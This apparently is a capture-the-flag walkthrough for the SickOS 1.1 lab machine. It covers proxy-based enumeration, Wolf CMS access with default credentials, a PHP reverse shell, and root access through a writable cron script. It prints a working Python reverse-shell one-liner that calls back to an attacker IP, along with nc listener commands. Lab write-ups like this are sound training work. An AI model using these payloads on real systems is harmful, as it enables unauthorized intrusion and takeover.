# Overview
Machine Name: SickOS 1.1

Difficulty: Intermediate

Objective: Capture the Root Flag

Key Techniques: Squid Proxy Enumeration, CMS Exploitation, Cron Job Privilege Escalation

## 1. Enumeration
### Host Discovery

We identify the target's IP address within the local network.

`arp-scan -l -I eth0`

Target IP: 192.168.29.167

Service Scanning
A full Nmap scan reveals two open ports, notably a web proxy service.

`nmap -T4 -A -p- 192.168.29.167`

Port 22/tcp: SSH (OpenSSH 5.9p1)

Port 3128/tcp: HTTP-Proxy (Squid 3.1.19)

### Proxy Exploration

Direct access to the web server is blocked, but the Squid proxy on port 3128 allows us to tunnel traffic to the local web server. By configuring FoxyProxy or using curl with a proxy flag, we can access the hidden web content.

Directory Fuzzing via Proxy:

```Bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u http://192.168.29.167/FUZZ \
     -x http://192.168.29.167:3128
```

Key Discoveries:

/robots.txt: Revealed the /wolfcms directory.

/connect: Contained a Python-related file.

## 2. Exploitation
### CMS Access
Navigating to http://192.168.29.167/wolfcms/ reveals a Wolf CMS installation.

Accessed the admin panel at /wolfcms/?admin.

Tested default credentials: admin:admin (Success).

### Initial Access (Reverse Shell)
Inside the CMS, we can edit page snippets or themes to execute PHP code.

Navigate to the Pages or Snippets tab.

Inject a PHP Reverse Shell (e.g., PentestMonkey's script).

Set up a listener on the attack machine: nc -lvnp 8888.

Trigger the script by visiting the modified page via the proxy.

## 3. Privilege Escalation
### Cron Job Enumeration

Once inside as the www-data user, we check for scheduled tasks that might be running with elevated privileges.

`cat /etc/cron.d/automate`

Output:

`* * * * * root /usr/bin/python /var/www/connect.py`

A Python script located at /var/www/connect.py is executed by root every minute.

### Exploiting the Cron Job
Since the script is world-writable (or writable by www-data), we can overwrite it with a Python one-liner to spawn a root shell.

```Bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.29.199",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /var/www/connect.py
```

## 4. Post-Exploitation
Start a listener on port 443. Within one minute, the cron job executes and returns a root shell.

```Bash
nc -lvnp 443
# Connection received from 192.168.29.167
whoami
# root
```

Root Flag:

a0216ea4d51874464078c618298b1367.txt
"If you are viewing this!! ROOT! You have Succesfully completed SickOS1.1."

## Lessons Learned
Proxy Bypassing: When a port appears "filtered" or a proxy is present, use it to scan the internal 127.0.0.1 or the external IP to see restricted content.

Default Credentials: CMS platforms are frequently left with default admin:admin or admin:password combinations.

Insecure File Permissions: Critical scripts executed by root (like those in /var/www/) should never be writable by low-privileged users.